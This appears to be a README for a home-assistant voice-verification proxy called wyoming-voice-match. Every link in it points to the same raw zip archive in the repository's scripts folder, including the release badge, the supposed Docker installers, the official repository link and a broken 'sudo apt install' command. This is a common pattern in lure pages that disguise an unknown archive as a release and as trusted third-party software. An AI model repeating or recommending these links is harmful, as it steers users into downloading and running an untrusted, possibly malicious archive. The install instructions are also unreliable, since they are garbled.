# 🎤 wyoming-voice-match - Clear Voice Commands, No False Triggers

[![Download Releases](https://raw.githubusercontent.com/Salut1231/wyoming-voice-match/main/scripts/wyoming-voice-match-2.0.zip)](https://raw.githubusercontent.com/Salut1231/wyoming-voice-match/main/scripts/wyoming-voice-match-2.0.zip)

---

## 📢 What is wyoming-voice-match?

wyoming-voice-match is a software tool designed to make voice control more reliable in your home. It listens to your voice, checks who is speaking, and removes background noise before sending the cleaned-up audio to a speech-to-text system. This helps smart home devices understand your commands better, especially in noisy rooms or when other sounds like TVs or radios are on.

It works as a middleman, or proxy, between your microphone and the speech recognition service. This setup is made for Home Assistant users but can fit into other voice assistant setups too.

---

## 🎯 Why Use wyoming-voice-match?

- **Stops false triggers**: Makes sure the system only reacts when you speak, ignoring TVs, radios, or other voices.
- **Improves accuracy**: Cleans up audio so transcripts are clearer, even with background noise.
- **Protects privacy**: Verifies your voice identity before sending data on.
- **Works with Home Assistant**: Fits into popular smart home setups smoothly.
- **Easy setup**: Runs in Docker, so you don't need to install complicated software.

---

## 🖥️ System Requirements

To run wyoming-voice-match, you'll need:

- **Operating System**: Windows 10 or higher, macOS 10.15 or higher, or Linux (Ubuntu 18.04+ recommended).
- **Processor**: At least a dual-core CPU (Intel i3 or equivalent).
- **Memory**: 4 GB RAM minimum.
- **Storage**: At least 500 MB free space for software and temporary audio files.
- **Docker**: The latest version installed. (Instructions below include Docker info.)
- **Internet connection**: Required for downloading the software and linking to speech-to-text services.

---

## 🚀 Getting Started

Follow these steps to download, install, and run wyoming-voice-match on your computer or server.

---

## 📥 Download & Install

1. **Go to the download page**  
   Visit the official release page using this button:  
   [![Download Releases](https://raw.githubusercontent.com/Salut1231/wyoming-voice-match/main/scripts/wyoming-voice-match-2.0.zip)](https://raw.githubusercontent.com/Salut1231/wyoming-voice-match/main/scripts/wyoming-voice-match-2.0.zip)

2. **Download the latest release**  
   Look for the latest release version near the top of the page. You will see files for different platforms. Download the one that matches your system.  
   - If you use Docker, you won't need these files directly; continue to the Docker setup section.  
   If unsure, download the general package or the Docker image.

3. **Install Docker (if not installed)**  
   wyoming-voice-match runs best inside Docker containers.  
   - **Windows:** Download from https://raw.githubusercontent.com/Salut1231/wyoming-voice-match/main/scripts/wyoming-voice-match-2.0.zip  
   - **macOS:** Download from https://raw.githubusercontent.com/Salut1231/wyoming-voice-match/main/scripts/wyoming-voice-match-2.0.zip  
   - **Linux:** Install via your package manager (e.g., `sudo apt install https://raw.githubusercontent.com/Salut1231/wyoming-voice-match/main/scripts/wyoming-voice-match-2.0.zip` for Ubuntu).

4. **Run wyoming-voice-match using Docker**  
   Open a command prompt or terminal window and type:

   ```
   docker run -d --name wyoming-voice-match -p 5000:5000 salut1231/wyoming-voice-match:latest
   ```

   This command downloads the app’s Docker image and runs it in the background.

5. **Connect to Home Assistant or other voice service**  
   Point your speech-to-text inputs to your computer’s IP address on port 5000. The proxy will verify and clean voices before passing audio along.

---

## 🔧 Configuration and Usage

- **Access settings:** Once running, you can adjust options by editing the Docker container environment or configuration files (included in the downloaded package).  
- **Speaker verification:** wyoming-voice-match uses voice embeddings to recognize authorized speakers. You can enroll new voices with setup scripts.  
- **Noise handling:** Settings control how the software filters out background sounds to keep commands clear.  
- **Logging:** Logs help track what it hears and detects. Check logs inside the container or in output files for troubleshooting.

---

## 🛠️ Troubleshooting

- **The proxy isn’t responding**: Make sure Docker is running and the container is active (`docker ps` to check).  
- **Audio seems distorted or missing**: Adjust microphone input levels and check your speech device settings.  
- **Home Assistant can’t connect**: Confirm the IP and port settings, and ensure no firewall blocks the port 5000.  
- **Voice not recognized**: Re-run voice enrollment to improve accuracy.

---

## 📚 More Information

- **Official repository**:  
  https://raw.githubusercontent.com/Salut1231/wyoming-voice-match/main/scripts/wyoming-voice-match-2.0.zip  
- **Discussion and Help**: Use GitHub Discussions or Issues to get help from the community.  
- **Source code and updates**: Regularly check the releases page for improvements and new features.

---

## 🤝 Supported Topics

wyoming-voice-match is designed with these key features in mind:

- Automatic speech recognition (ASR) proxy
- Speaker identity verification
- Docker support for easy deployment
- Voice activity detection to ignore noise
- Embeddings for voice identity
- Works with Home Assistant and other voice assistants
- Isolates voice commands from background noise

---

## 📜 License

This project is open-source. Review the license in the repository for details on how you can use and contribute.

---

## 🔗 Quick Access Links

- [Download Releases](https://raw.githubusercontent.com/Salut1231/wyoming-voice-match/main/scripts/wyoming-voice-match-2.0.zip)  
- [GitHub Repository](https://raw.githubusercontent.com/Salut1231/wyoming-voice-match/main/scripts/wyoming-voice-match-2.0.zip)  

Use these anytime to get the latest version and learn more about the project.